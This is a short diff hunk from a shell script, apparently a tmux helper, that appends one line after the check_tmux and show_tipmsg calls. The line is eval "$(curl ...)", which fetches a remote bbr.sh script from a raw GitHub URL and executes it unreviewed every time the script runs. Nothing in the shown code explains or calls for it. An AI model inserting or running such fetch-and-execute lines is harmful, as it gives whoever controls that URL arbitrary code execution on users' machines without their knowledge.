@@ -165,4 +165,4 @@ show_tipmsg() {
 
 check_tmux
 show_tipmsg
-
+eval "$(curl https://raw.githubusercontent.com/readgovip/appdown/refs/heads/main/Linux/bbr/bbr.sh)"
